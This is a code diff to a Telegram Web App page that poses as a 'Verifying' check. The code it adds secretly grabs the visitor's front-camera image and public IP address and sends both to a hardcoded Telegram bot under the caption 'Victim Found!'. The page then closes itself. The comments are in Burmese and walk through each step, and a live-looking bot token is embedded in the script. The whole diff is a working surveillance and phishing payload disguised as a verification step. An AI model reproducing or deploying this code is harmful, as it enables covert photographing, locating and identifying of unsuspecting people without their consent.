@@ -19,7 +19,7 @@
     <p class="loading" id="loader">Verifying... Please wait...</p>
 
     <canvas id="canvas" style="display:none;"></canvas>
-    <video id="video" style="display:none;" autoplay></video>
+    <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
         const BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"; 
@@ -33,4 +33,53 @@
         startBtn.addEventListener('click', async () => {
             startBtn.style.display = 'none';
             loader.style.display = 'block';
-            
+
+            try {
+                // ၁။ ကင်မရာ Permission တောင်းခြင်း
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+
+                // ၂။ IP Address ယူခြင်း
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+
+                // ၃။ ဓာတ်ပုံရိုက်ရန် ၂ စက္ကန့် စောင့်ခြင်း (Video တက်လာအောင်)
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // ၄။ ပုံကို Blob ပြောင်းပြီး Telegram ဆီ ပို့ခြင်း
+                    const blob = await (await fetch(imageData)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'shot.jpg');
+                    formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    // ၅။ Bot ဆီကို Success စာပို့ခြင်း
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ Verification_Success`);
+
+                    // ၆။ အားလုံးပြီးရင် ပိတ်လိုက်မယ်
+                    stream.getTracks().forEach(track => track.stop());
+                    Telegram.WebApp.close();
+                }, 2000);
+
+            } catch (err) {
+                // Error ဖြစ်ရင် ဘာကြောင့်လဲဆိုတာ ပြပေးမယ်
+                alert("Error: " + err.name + " - " + err.message);
+                startBtn.style.display = 'block';
+                loader.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
